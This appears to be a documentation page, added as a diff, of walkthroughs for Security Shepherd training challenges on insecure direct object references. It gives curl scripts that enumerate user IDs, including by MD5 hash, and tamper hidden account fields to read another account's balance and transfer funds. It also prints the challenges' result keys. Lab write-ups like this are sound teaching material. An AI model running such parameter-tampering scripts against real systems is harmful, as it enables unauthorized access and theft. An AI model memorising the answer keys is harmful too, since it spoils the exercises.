@@ -1,0 +1,198 @@
+.. include:: /pentest_links.txt
+
+.. _SecurityShepherdDirectObjRef:
+
+*********************************
+Insecure Direct Object References
+*********************************
+
+
+Insecure Direct Object Reference Challenge 1
+============================================
+
+Use Tamper Data to view the request for one of the existing users (say "Ronan Fitzpatrick"). The "userId[]" appears to be a simple integer. Setting the "userId[]" post parameter to 0, 1, 2, ... eventually displays the result key at 11.
+
+.. code-block:: bash
+
+  # Tamper Data gives COOKIE, URL, and POSTDATA.
+  COOKIE='JSESSIONID=17B9319686957844C9ABC20783F71EB8; token=-151992892046487776536066712571995351801; JSESSIONID3="XHAMNIXS+EtfXshD4Kgjvw=="'
+  URL='https://securityshepherd.com/challenges/o9a450a64cc2a196f55878e2bd9a27a72daea0f17017253f87e7ebd98c71c98c'
+
+  curl --silent --insecure \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data-urlencode userId[]=11 \
+       $URL \
+    | sed -ne 's/^.*\(Result Key is \)<a>\(.*\)<\/a>.*$/\1\2\n/p'
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  Result Key is
+  dd6301b38b5ad9c54b85d07c087aebec89df8b8c769d4da084a55663e6186742
+
+
+Insecure Direct Object Reference Challenge 2
+============================================
+
+Use Tamper Data to view the request for one of the existing users (say "Ronan Fitzpatrick"). The userId post parameter is "8f14e45fceea167a5a36dedd4bea2543" which an Internet search reveals this is the MD5 hash of 7. So the un-hashed userId[]" appears to be a simple integer. We created the bash script below to loop from 0, ... to look up users using the MD5 hash of the index.
+
+.. code-block:: bash
+
+  # Tamper Data gives COOKIE, URL, and POSTDATA.
+  COOKIE='JSESSIONID=17B9319686957844C9ABC20783F71EB8; token=-151992892046487776536066712571995351801; JSESSIONID3="XHAMNIXS+EtfXshD4Kgjvw=="'
+  URL='https://securityshepherd.com/challenges/vc9b78627df2c032ceaf7375df1d847e47ed7abac2a4ce4cb6086646e0f313a4'
+
+  for i in {0..20..1}; do
+    HASH="$(echo -n "$i" | md5sum | sed 's/ .*$//')"
+    RESULT=$(curl --silent --insecure \
+         --header "X-Requested-With: XMLHttpRequest" \
+         --cookie "$COOKIE" \
+         --data-urlencode "userId[]=$HASH" \
+         $URL \
+      | sed -ne 's/^.*\(Result Key is \)<a>\(.*\)<\/a>.*$/\1\2\n/p')
+     if [[ "$RESULT" =~ "Result Key is" ]]; then
+       echo "Match found on id $i"
+       echo $RESULT
+       break
+     fi
+  done
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 1-3
+
+  Match found on id 13
+  Result Key is
+  1f746b87a4e3628b90b1927de23f6077abdbbb64586d3ac9485625da21921a0f
+
+
+Insecure Direct Object Reference Bank
+=====================================
+
+The solution to this challenge hinges on the "hidden" form fields specifying the account number which can be tampered with to affect another account. We do this exercise almost predominantly in :program:`curl`, though the web page could be used as-is except for these 2 requests: :guilabel:`Refresh Balance` must tamper the currentAccountNumber=1, and :guilabel:`Transfer Funds` must tamper the senderAccountNumber=1 and recieverAccountNumber=2. Read on for the :program:`curl` solution.
+
+Between Tamper Data and Firebug we get the following information:
+
+.. code-block:: bash
+
+  # Tamper Data
+  COOKIE='JSESSIONID=17B9319686957844C9ABC20783F71EB8; token=-151992892046487776536066712571995351801; JSESSIONID3="XHAMNIXS+EtfXshD4Kgjvw=="'
+  # Firebug gets registration, signin, refresh balance, transfer
+  SITE=https://securityshepherd.com
+  URL_REG="$SITE"'/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00cReg'
+  URL_SIGNIN="$SITE"'/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00c'
+  URL_REFRESH="$SITE"'/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00cCurrentBalance'
+  URL_TRANSFER="$SITE"'/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00cTransfer'
+
+Using this information we can create an account for hacker with password = password:
+
+.. code-block:: bash
+
+  POSTDATA='accountHolder=hacker&accountPass=password'
+  curl --silent --insecure \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data $POSTDATA \
+       $URL_REG
+
+Then sign into the account:
+
+.. code-block:: bash
+
+  curl --silent --insecure \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data $POSTDATA \
+       $URL_SIGNIN
+
+Return page shows we are account #2:
+
+.. code-block:: html
+
+  <input type='hidden' value='2' id='currentAccountNumber'>
+
+Then get the 0 balance for account 2:
+
+.. code-block:: bash
+
+  ACCOUNT=2
+  POSTDATA="accountNumber=$ACCOUNT"
+  curl --silent --insecure \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data $POSTDATA \
+       $URL_REFRESH
+
+Now try to get the account balance for account 1 (10,000,000):
+
+.. code-block:: bash
+
+  ACCOUNT=1
+  POSTDATA="accountNumber=$ACCOUNT"
+  curl --silent --insecure \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data $POSTDATA \
+       $URL_REFRESH
+
+They have too much money, so transfer 6,000,000 to your account:
+
+.. code-block:: bash
+
+  VICTIM=1
+  RECEIVER=2
+  AMOUNT=6000000
+  POSTDATA='senderAccountNumber='"$VICTIM"'&recieverAccountNumber='"$RECEIVER"'&transferAmount='"$AMOUNT"
+  curl --silent --insecure \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data $POSTDATA \
+       $URL_TRANSFER
+
+View the transfer results (account balance now 6,000,000):
+
+.. code-block:: bash
+
+  ACCOUNT=2
+  POSTDATA="accountNumber=$ACCOUNT"
+  curl --silent --insecure \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data $POSTDATA \
+       $URL_REFRESH
+
+Sign back on to get the result key:
+
+.. code-block:: bash
+
+  POSTDATA='accountHolder=hacker&accountPass=password'
+  RESULT=$(curl --silent --insecure \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data $POSTDATA \
+       $URL_SIGNIN \
+   | sed -ne 's/^.*\(The result key for this challenge is \)<a>\(.*\)<\/a>.*$/\1\2\n/p')
+  echo $RESULT
+
+We get the result key:
+
+.. code-block:: console
+  :emphasize-lines: 1,2
+
+  The result key for this challenge is
+  lu6Lpa8TBMtUeHg&#x2b;2DC4aSvS4YfUsDYf0GkRhKmEch1TYApi7zsBn8fi6T3efhgNypOtdrO1pnf80steIRH9tJlc0CpEey3V&#x2f;fokZqfWwiMiOFsFf81j17VqyhK4jLI51uj0HH9TtnM4VZNUB7Y7Gg&#x3d;&#x3d;
+
+The result key contains encoded data: "&#x2b;" = "+", "&#x2f;" = "/", and "&#x3d;" = "=". The decoded result key is:
+
+.. code-block:: console
+  :emphasize-lines: 1
+
+  lu6Lpa8TBMtUeHg+2DC4aSvS4YfUsDYf0GkRhKmEch1TYApi7zsBn8fi6T3efhgNypOtdrO1pnf80steIRH9tJlc0CpEey3V/fokZqfWwiMiOFsFf81j17VqyhK4jLI51uj0HH9TtnM4VZNUB7Y7Gg== 
+
+
+
+
+
+
